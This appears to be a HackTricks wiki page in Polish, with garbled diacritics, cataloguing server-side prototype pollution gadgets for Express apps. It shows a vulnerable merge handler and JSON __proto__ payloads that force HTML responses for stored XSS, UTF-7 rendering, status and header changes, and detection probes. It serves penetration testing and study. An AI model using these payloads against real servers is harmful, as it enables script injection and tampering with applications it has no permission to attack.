# Gad偶ety do Zanieczyszczenia Prototypu w Express

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

## Serwuj odpowiedzi XSS

**Aby uzyska wicej szczeg贸贸w** [**zobacz oryginalne badania**](https://portswigger.net/research/server-side-prototype-pollution)

### Zmie typ zawartoci JSON na HTML

W aplikacji Express u偶ywajcej **odpowiedzi z typem zawartoci JSON** i odzwierciedlajcej JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
W tych przypadkach XSS zazwyczaj nie jest mo偶liwe z typem zawartoci JSON. Jednak dziki zanieczyszczeniu prototypu mo偶emy **zmyli Express, aby zwr贸ci odpowied藕 HTML.** Ta podatno polega na tym, 偶e aplikacja u偶ywa **`res.send(obj)`** i korzysta z parsera ciaa z typem zawartoci application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Poprzez **zanieczyszczenie** waciwoci **`body`** i **`_body`**, mo偶liwe jest spowodowanie, 偶e **Express bdzie serwowa typ zawartoci HTML** i odzwierciedli waciwo `_body`, co skutkuje przechowywanym XSS.

### Render UTF7

Mo偶liwe jest, aby express **renderowa zawarto UTF-7 za pomoc**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Bezpieczne techniki skanowania

### Przestrzenie JSON

Nastpujce PP spowoduje, 偶e atrybuty wewntrz JSON bd miay dodatkow przestrze, co nie wpynie na funkcjonalno:
```json
{"__proto__":{"json spaces": " "}}
```
Wtedy odzwierciedlony JSON bdzie wyglda nastpujco:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

Nastpujcy gad偶et PP spowoduje, 偶e serwer wyle z powrotem nag贸wek HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Wymaga zainstalowania **moduu CORS**

### **Metoda OPTIONS**

Za pomoc poni偶szego adunku mo偶liwe jest **ukrycie metody w odpowiedzi OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Mo偶liwe jest zmienienie **zwracanego kodu statusu** za pomoc nastpujcego adunku PP:
```json
{"__proto__":{"status":510}}
```
### Bd

Kiedy przypisujesz do prototypu z prymitywem, takim jak cig, produkuje to **operacj no-op, poniewa偶 prototyp musi by obiektem**. Jeli spr贸bujesz przypisa obiekt prototypu do samego `Object.prototype`, to **wyrzuci wyjtek**. Mo偶emy u偶y tych dw贸ch zachowa do **wykrycia, czy zanieczyszczenie prototypu byo udane**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Kiedy aplikacja zawiera obiekt w swojej odpowiedzi, stworzenie atrybutu o **nietypowej nazwie obok `__proto__`** mo偶e by pouczajce. W szczeg贸lnoci, jeli **tylko nietypowy atrybut jest zwracany** w odpowiedzi, mo偶e to wskazywa na podatno aplikacji:
```json
{"unusualName":"value","__proto__":"test"}
```
Ponadto, w scenariuszach, w kt贸rych u偶ywana jest biblioteka taka jak Lodash, ustawienie waciwoci zar贸wno za pomoc zanieczyszczenia prototypu (PP), jak i bezporednio w obiekcie, oferuje inne podejcie diagnostyczne. Jeli taka waciwo jest pomijana w odpowiedzi, sugeruje to, 偶e Lodash weryfikuje istnienie waciwoci w docelowym obiekcie przed scaleniem:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

Istnieje opcja w Express, kt贸ra pozwala na **tworzenie obiekt贸w z parametr贸w cigu zapytania**.\
Mo偶esz to zdecydowanie wykorzysta w acuchu **bd贸w**, aby wykorzysta **wra偶liwo na zanieczyszczenie prototypu**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` tworzy obiekt w Node.**

## References

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
